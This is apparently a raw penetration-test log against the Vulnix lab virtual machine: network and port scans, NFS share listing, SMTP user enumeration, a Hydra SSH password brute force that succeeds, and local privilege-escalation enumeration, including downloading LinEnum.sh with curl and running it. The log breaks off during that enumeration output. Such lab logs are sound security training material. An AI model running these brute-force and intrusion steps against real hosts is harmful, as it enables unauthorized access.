####Reconnaissance:

root@kali:~/# netdiscover -r 192.168.118.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                         

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                       
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.118.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                      
 192.168.118.2   00:50:56:f4:18:88      1      60  Unknown vendor                                                      
 192.168.118.188 00:0c:29:26:bb:13      1      60  Unknown vendor                                                      
 192.168.118.254 00:50:56:fe:e2:bc      1      60  Unknown vendor            


 ####Enumeration:


 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-21 11:08 MDT
 NSE: Loaded 143 scripts for scanning.
 NSE: Script Pre-scanning.
 Initiating NSE at 11:08
 Completed NSE at 11:08, 0.00s elapsed
 Initiating NSE at 11:08
 Completed NSE at 11:08, 0.00s elapsed
 Initiating ARP Ping Scan at 11:08
 Scanning 192.168.118.188 [1 port]
 Completed ARP Ping Scan at 11:08, 0.04s elapsed (1 total hosts)
 Initiating Parallel DNS resolution of 1 host. at 11:08
 Completed Parallel DNS resolution of 1 host. at 11:08, 0.06s elapsed
 Initiating SYN Stealth Scan at 11:08
 Scanning 192.168.118.188 [65535 ports]
 Discovered open port 111/tcp on 192.168.118.188
 Discovered open port 993/tcp on 192.168.118.188
 Discovered open port 22/tcp on 192.168.118.188
 Discovered open port 110/tcp on 192.168.118.188
 Discovered open port 995/tcp on 192.168.118.188
 Discovered open port 143/tcp on 192.168.118.188
 Discovered open port 25/tcp on 192.168.118.188
 Discovered open port 35051/tcp on 192.168.118.188
 Discovered open port 514/tcp on 192.168.118.188
 Discovered open port 513/tcp on 192.168.118.188
 Discovered open port 51382/tcp on 192.168.118.188
 Discovered open port 47553/tcp on 192.168.118.188
 Discovered open port 43746/tcp on 192.168.118.188
 Discovered open port 512/tcp on 192.168.118.188
 Discovered open port 79/tcp on 192.168.118.188
 Discovered open port 2049/tcp on 192.168.118.188
 Discovered open port 41549/tcp on 192.168.118.188
 Completed SYN Stealth Scan at 11:08, 2.02s elapsed (65535 total ports)
 Initiating Service scan at 11:08
 Scanning 17 services on 192.168.118.188
 Completed Service scan at 11:09, 29.26s elapsed (17 services on 1 host)
 Initiating OS detection (try #1) against 192.168.118.188
 NSE: Script scanning 192.168.118.188.
 Initiating NSE at 11:09
 Completed NSE at 11:09, 10.22s elapsed
 Initiating NSE at 11:09
 Completed NSE at 11:09, 0.03s elapsed
 Nmap scan report for 192.168.118.188
 Host is up (0.00040s latency).
 Not shown: 65518 closed ports
 PORT      STATE SERVICE    VERSION
 22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
 |   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
 |_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
 25/tcp    open  smtp       Postfix smtpd
 |_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
 | ssl-cert: Subject: commonName=vulnix
 | Issuer: commonName=vulnix
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2012-09-02T17:40:12
 | Not valid after:  2022-08-31T17:40:12
 | MD5:   58e3 f1ac fef6 b6d1 744c 836f ba24 4f0a
 |_SHA-1: 712f 69ba 8c54 32e5 711c 898b 55ab 0a83 44a0 420b
 |_ssl-date: 2017-05-21T17:09:08+00:00; +2s from scanner time.
 79/tcp    open  finger     Linux fingerd
 |_finger: No one logged on.\x0D
 110/tcp   open  pop3       Dovecot pop3d
 |_pop3-capabilities: TOP SASL RESP-CODES CAPA STLS PIPELINING UIDL
 | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
 | Issuer: commonName=vulnix/organizationName=Dovecot mail server
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2012-09-02T17:40:22
 | Not valid after:  2022-09-02T17:40:22
 | MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
 |_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
 |_ssl-date: 2017-05-21T17:09:08+00:00; +2s from scanner time.
 111/tcp   open  rpcbind    2-4 (RPC #100000)
 | rpcinfo:
 |   program version   port/proto  service
 |   100000  2,3,4        111/tcp  rpcbind
 |   100000  2,3,4        111/udp  rpcbind
 |   100003  2,3,4       2049/tcp  nfs
 |   100003  2,3,4       2049/udp  nfs
 |   100005  1,2,3      33802/udp  mountd
 |   100005  1,2,3      43746/tcp  mountd
 |   100021  1,3,4      41549/tcp  nlockmgr
 |   100021  1,3,4      58382/udp  nlockmgr
 |   100024  1          35051/tcp  status
 |   100024  1          56599/udp  status
 |   100227  2,3         2049/tcp  nfs_acl
 |_  100227  2,3         2049/udp  nfs_acl
 143/tcp   open  imap       Dovecot imapd
 |_imap-capabilities: more SASL-IR IDLE LITERAL+ LOGINDISABLEDA0001 ENABLE post-login have listed Pre-login capabilities OK STARTTLS LOGIN-REFERRALS ID IMAP4rev1
 | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
 | Issuer: commonName=vulnix/organizationName=Dovecot mail server
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2012-09-02T17:40:22
 | Not valid after:  2022-09-02T17:40:22
 | MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
 |_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
 |_ssl-date: 2017-05-21T17:09:08+00:00; +1s from scanner time.
 512/tcp   open  exec       netkit-rsh rexecd
 513/tcp   open  login?
 514/tcp   open  tcpwrapped
 993/tcp   open  ssl/imap   Dovecot imapd
 |_imap-capabilities: SASL-IR IDLE LITERAL+ more ENABLE post-login have listed capabilities AUTH=PLAINA0001 OK Pre-login LOGIN-REFERRALS ID IMAP4rev1
 | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
 | Issuer: commonName=vulnix/organizationName=Dovecot mail server
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2012-09-02T17:40:22
 | Not valid after:  2022-09-02T17:40:22
 | MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
 |_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
 |_ssl-date: 2017-05-21T17:09:08+00:00; +2s from scanner time.
 995/tcp   open  ssl/pop3   Dovecot pop3d
 |_pop3-capabilities: TOP SASL(PLAIN) RESP-CODES CAPA USER PIPELINING UIDL
 | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
 | Issuer: commonName=vulnix/organizationName=Dovecot mail server
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2012-09-02T17:40:22
 | Not valid after:  2022-09-02T17:40:22
 | MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
 |_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
 |_ssl-date: 2017-05-21T17:09:08+00:00; +2s from scanner time.
 2049/tcp  open  nfs_acl    2-3 (RPC #100227)
 35051/tcp open  status     1 (RPC #100024)
 41549/tcp open  nlockmgr   1-4 (RPC #100021)
 43746/tcp open  mountd     1-3 (RPC #100005)
 47553/tcp open  mountd     1-3 (RPC #100005)
 51382/tcp open  mountd     1-3 (RPC #100005)
 MAC Address: 00:0C:29:26:BB:13 (VMware)
 Device type: general purpose
 Running: Linux 2.6.X|3.X
 OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
 OS details: Linux 2.6.32 - 3.10
 Uptime guess: 198.840 days (since Thu Nov  3 14:59:49 2016)
 Network Distance: 1 hop
 TCP Sequence Prediction: Difficulty=263 (Good luck!)
 IP ID Sequence Generation: All zeros
 Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Host script results:
 |_clock-skew: mean: 1s, deviation: 0s, median: 1s

 TRACEROUTE
 HOP RTT     ADDRESS
 1   0.40 ms 192.168.118.188

 NSE: Script Post-scanning.
 Initiating NSE at 11:09
 Completed NSE at 11:09, 0.00s elapsed
 Initiating NSE at 11:09
 Completed NSE at 11:09, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 43.81 seconds
            Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)

__

root@kali:~/vulnix# nmap -sV --script=nfs-showmount 192.168.118.188

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-21 11:50 MDT
Nmap scan report for 192.168.118.188
Host is up (0.00022s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
79/tcp   open  finger     Linux fingerd
110/tcp  open  pop3       Dovecot pop3d
111/tcp  open  rpcbind    2-4 (RPC #100000)
| nfs-showmount:
|_  /home/vulnix *
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33802/udp  mountd
|   100005  1,2,3      43746/tcp  mountd
|   100021  1,3,4      41549/tcp  nlockmgr
|   100021  1,3,4      58382/udp  nlockmgr
|   100024  1          35051/tcp  status
|   100024  1          56599/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
143/tcp  open  imap       Dovecot imapd
512/tcp  open  exec       netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
993/tcp  open  ssl/imap   Dovecot imapd
995/tcp  open  ssl/pop3   Dovecot pop3d
2049/tcp open  nfs_acl    2-3 (RPC #100227)
MAC Address: 00:0C:29:26:BB:13 (VMware)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.94 seconds

root@kali:~/vulnix# nfspy -o server=192.168.118.188:/home/vulnix/ ~/vulnix/mount/

root@kali:~/vulnix# ls -la mount/
total 13
drwxr-x--- 2 2008 2008 4096 Sep  2  2012 .
drwxr-xr-x 3 root root 4096 May 21 11:35 ..
-rw-r--r-- 1 2008 2008  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 2008 2008 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 2008 2008  675 Apr  3  2012 .profile

Nothing overly cool jumps out, the share isn't writable.

msf auxiliary(smtp_enum) > set rhosts 192.168.118.188
rhosts => 192.168.118.188
msf auxiliary(smtp_enum) > run

[*] 192.168.118.188:25    - 192.168.118.188:25 Banner: 220 vulnix ESMTP Postfix (Ubuntu)
[+] 192.168.118.188:25    - 192.168.118.188:25 Users found: , backup, bin, daemon, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, postmaster, proxy, sshd, sync, sys, syslog, user, uucp, www-data
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smtp_enum) >

**

The user account looks interesting.

root@kali:~/vulnix# hydra -l user -P /usr/share/wordlists/fasttrack.txt 192.168.118.188 ssh
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-05-21 14:06:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.118.188   login: user   password: letmein
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-21 14:07:01
root@kali:~/vulnix#

Cool password.

user@vulnix:~$ cat /proc/version
Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012
user@vulnix:~$

user@vulnix:~$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Sep  2  2012 .
drwxr-xr-x 22 root   root   4096 Sep  2  2012 ..
drwxr-x---  3 user   user   4096 Sep  2  2012 user
drwxr-x---  2 vulnix vulnix 4096 Sep  2  2012 vulnix
user@vulnix:~$ ps aux | grep root
root         1  0.0  0.3   3512  1948 ?        Ss   18:05   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    18:05   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    18:05   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    18:05   0:00 [kworker/u:0]
root         6  0.0  0.0      0     0 ?        S    18:05   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S    18:05   0:00 [watchdog/0]
root         8  0.0  0.0      0     0 ?        S<   18:05   0:00 [cpuset]
root         9  0.0  0.0      0     0 ?        S<   18:05   0:00 [khelper]
root        10  0.0  0.0      0     0 ?        S    18:05   0:00 [kdevtmpfs]
root        11  0.0  0.0      0     0 ?        S<   18:05   0:00 [netns]
root        12  0.0  0.0      0     0 ?        S    18:05   0:00 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    18:05   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S<   18:05   0:00 [kintegrityd]
root        15  0.0  0.0      0     0 ?        S<   18:05   0:00 [kblockd]
root        16  0.0  0.0      0     0 ?        S<   18:05   0:00 [ata_sff]
root        17  0.0  0.0      0     0 ?        S    18:05   0:00 [khubd]
root        18  0.0  0.0      0     0 ?        S<   18:05   0:00 [md]
root        21  0.0  0.0      0     0 ?        S    18:05   0:00 [khungtaskd]
root        22  0.0  0.0      0     0 ?        S    18:05   0:00 [kswapd0]
root        23  0.0  0.0      0     0 ?        SN   18:05   0:00 [ksmd]
root        24  0.0  0.0      0     0 ?        S    18:05   0:00 [fsnotify_mark]
root        25  0.0  0.0      0     0 ?        S    18:05   0:00 [ecryptfs-kthrea]
root        26  0.0  0.0      0     0 ?        S<   18:05   0:00 [crypto]
root        34  0.0  0.0      0     0 ?        S<   18:05   0:00 [kthrotld]
root        37  0.0  0.0      0     0 ?        S    18:05   0:00 [scsi_eh_0]
root        38  0.0  0.0      0     0 ?        S    18:05   0:00 [scsi_eh_1]
root        39  0.0  0.0      0     0 ?        S    18:05   0:00 [kworker/u:3]
root        60  0.0  0.0      0     0 ?        S<   18:06   0:00 [devfreq_wq]
root       175  0.0  0.0      0     0 ?        S<   18:06   0:00 [mpt_poll_0]
root       178  0.0  0.0      0     0 ?        S<   18:06   0:00 [mpt/0]
root       202  0.0  0.0      0     0 ?        S    18:06   0:00 [scsi_eh_2]
root       215  0.0  0.0      0     0 ?        S<   18:06   0:00 [kdmflush]
root       223  0.0  0.0      0     0 ?        S<   18:06   0:00 [kdmflush]
root       237  0.0  0.0      0     0 ?        S    18:06   0:00 [jbd2/dm-0-8]
root       238  0.0  0.0      0     0 ?        S<   18:06   0:00 [ext4-dio-unwrit]
root       434  0.0  0.1   2816   608 ?        S    18:06   0:00 upstart-udev-bridge --daemon
root       437  0.0  0.2   3072  1220 ?        Ss   18:06   0:00 /sbin/udevd --daemon
root       534  0.0  0.0      0     0 ?        S<   18:06   0:00 [kpsmoused]
root       610  0.0  0.0   2828   356 ?        S    18:06   0:00 upstart-socket-bridge --daemon
root       648  0.0  0.1   2744  1008 ?        Ss   18:06   0:00 rpcbind -w
root       675  0.0  0.1   3068   844 ?        S    18:06   0:00 /sbin/udevd --daemon
root       676  0.0  0.1   3068   844 ?        S    18:06   0:00 /sbin/udevd --daemon
root       707  0.0  0.0      0     0 ?        S<   18:06   0:00 [rpciod]
root       727  0.0  0.0      0     0 ?        S<   18:06   0:00 [nfsiod]
root       747  0.0  0.0   2892   396 ?        Ss   18:06   0:00 rpc.idmapd
root       799  0.0  0.1   2908   812 ?        Ss   18:06   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -1 eth0
root       821  0.0  0.4   6664  2412 ?        Ss   18:06   0:00 /usr/sbin/sshd -D
root       904  0.0  0.1   4612   836 tty4     Ss+  18:06   0:00 /sbin/getty -8 38400 tty4
root       909  0.0  0.1   4612   844 tty5     Ss+  18:06   0:00 /sbin/getty -8 38400 tty5
root       920  0.0  0.1   4612   844 tty2     Ss+  18:06   0:00 /sbin/getty -8 38400 tty2
root       921  0.0  0.1   4612   844 tty3     Ss+  18:06   0:00 /sbin/getty -8 38400 tty3
root       924  0.0  0.1   4612   844 tty6     Ss+  18:06   0:00 /sbin/getty -8 38400 tty6
root       927  0.0  0.1   2412   716 ?        S    18:06   0:00 /usr/sbin/inetutils-inetd
root       945  0.0  0.2   2992  1184 ?        Ss   18:06   0:00 /usr/sbin/dovecot -F -c /etc/dovecot/dovecot.conf
root       948  0.0  0.1   2156   608 ?        Ss   18:06   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root       950  0.0  0.1   2600   768 ?        Ss   18:06   0:00 cron
root       978  0.0  0.1   2700   928 ?        S    18:06   0:00 dovecot/log
root      1003  0.0  0.0      0     0 ?        S    18:06   0:00 [lockd]
root      1004  0.0  0.0      0     0 ?        S<   18:06   0:00 [nfsd4]
root      1005  0.0  0.0      0     0 ?        S<   18:06   0:00 [nfsd4_callbacks]
root      1006  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1007  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1008  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1009  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1010  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1011  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1012  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1013  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1017  0.0  0.3   3568  1756 ?        Ss   18:06   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1121  0.0  0.2   4560  1464 ?        Ss   18:06   0:00 /usr/lib/postfix/master
root      1164  0.0  0.1   4612   840 tty1     Ss+  18:06   0:00 /sbin/getty -8 38400 tty1
root      1167  0.0  0.0      0     0 ?        S    18:06   0:00 [flush-252:0]
root     13811  0.0  0.0      0     0 ?        S    20:53   0:00 [kworker/0:2]
root     14317  0.0  0.0      0     0 ?        S    21:08   0:00 [kworker/0:1]
root     14328  0.0  0.0      0     0 ?        S    21:13   0:00 [kworker/0:0]
root     14329  0.0  0.6   9716  3180 ?        Ss   21:13   0:00 sshd: user [priv]   
user     14558  0.0  0.1   4372   832 pts/0    S+   21:14   0:00 grep --color=auto root
user@vulnix:~$

user@vulnix:/etc$ cat passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user,,,:/home/user:/bin/bash
vulnix:x:2008:2008::/home/vulnix:/bin/bash
user@vulnix:/etc$

user@vulnix:~$ find / -user root -perm -4000 -print > 4000.txt
user@vulnix:~$ cat 4000.txt
/sbin/mount.nfs
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/procmail
/bin/ping6
/bin/mount
/bin/umount
/bin/su
/bin/ping
/bin/fusermount


root@kali:~# searchsploit dbus
------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                       |  Path
                                                                                     | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------------------------- ----------------------------------
D-Bus Daemon < 1.2.4 - (libdbus) Denial of Service                                   | multiple/dos/7822.c
Automated Solutions Modbus/TCP OPC Server - Remote Heap Corruption (PoC)             | windows/dos/16040.py
Galil-RIO Modbus - Denial of Service                                                 | hardware/dos/27131.py
ScadaTEC ModbusTagServer & ScadaPhone - '.zip' Buffer Overflow                       | windows/local/17817.php
libdbus - 'DBUS_SYSTEM_BUS_ADDRESS' Privilege Escalation                             | linux/local/21323.c
dbus-glib pam_fprintd - Privilege Escalation                                         | linux/local/33614.c
Redbus Clone Script 3.05 - 'hid_Busid' Parameter SQL Injection                       | php/webapps/41517.txt
------------------------------------------------------------------------------------- ----------------------------------
root@kali:~#

user@vulnix:~$ gcc
The program 'gcc' can be found in the following packages:
 * gcc
 * pentium-builder
Ask your administrator to install one of them
user@vulnix:~$

user@vulnix:~$ curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

user@vulnix:~$ ./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
#

Debug Info
thorough tests = disabled


Scan started at:
Sun May 21 21:49:18 BST 2017


### SYSTEM ##############################################
Kernel information:
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux


Kernel information (continued):
Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012


Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04.1 LTS"


Hostname:
vulnix


### USER/GROUP ##########################################
Current user/group info:
uid=1000(user) gid=1000(user) groups=1000(user),100(users)


Users that have previously logged onto the system:
Username         Port     From             Latest
user             pts/0    192.168.118.186  Sun May 21 21:13:31 +0100 2017


Who else is logged on:
 21:49:18 up  3:43,  1 user,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/0    192.168.118.186  21:13    2.00s  0.42s  0.00s /bin/bash ./Lin


Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
uid=103(whoopsie) gid=106(whoopsie) groups=106(whoopsie)
uid=104(postfix) gid=110(postfix) groups=110(postfix)
uid=105(dovecot) gid=112(dovecot) groups=112(dovecot)
uid=106(dovenull) gid=65534(nogroup) groups=65534(nogroup)
uid=107(landscape) gid=113(landscape) groups=113(landscape)
uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(user) gid=1000(user) groups=1000(user),100(users)
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
uid=109(statd) gid=65534(nogroup) groups=65534(nogroup)


Sample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user,,,:/home/user:/bin/bash


Super user account(s):
root


Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root   root   4.0K Sep  2  2012 .
drwxr-xr-x 22 root   root   4.0K Sep  2  2012 ..
drwxr-x---  4 user   user   4.0K May 21 21:48 user
drwxr-x---  2 vulnix vulnix 4.0K Sep  2  2012 vulnix


Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
 Environment information:
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=192.168.118.186 41308 22
SSH_TTY=/dev/pts/0
USER=user
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
MAIL=/var/mail/user
PWD=/home/user
LANG=en_GB.UTF-8
HOME=/home/user
SHLVL=2
LANGUAGE=en_GB:en
LOGNAME=user
SSH_CONNECTION=192.168.118.186 41308 192.168.118.188 22
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games


Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


Current umask value:
0002
u=rwx,g=rwx,o=rx


umask value as specified in /etc/login.defs:
UMASK		022


Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
Cron jobs:
-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 May 21 12:06 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Sep  2  2012 .
drwxr-xr-x 91 root root  4096 May 21 12:06 ..
-rwxr-xr-x  1 root root   219 Apr 10  2012 apport
-rwxr-xr-x  1 root root 15399 Jun 15  2012 apt
-rwxr-xr-x  1 root root   314 Mar 30  2012 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root   256 Apr 13  2012 dpkg
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Mar 31  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Apr  9  2012 passwd
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
-rwxr-xr-x  1 root root   214 Aug  9  2012 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 May 21 12:06 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 May 21 12:06 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 May 21 12:06 ..
-rwxr-xr-x  1 root root  730 Dec 31  2011 apt-xapian-index
-rwxr-xr-x  1 root root  907 Mar 31  2012 man-db
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder


Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
Network & IP info:
eth0      Link encap:Ethernet  HWaddr 00:0c:29:26:bb:13  
          inet addr:192.168.118.188  Bcast:192.168.118.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe26:bb13/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:157725 errors:0 dropped:0 overruns:0 frame:0
          TX packets:153108 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:11449629 (11.4 MB)  TX bytes:12107468 (12.1 MB)
          Interrupt:18 Base address:0x2000

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
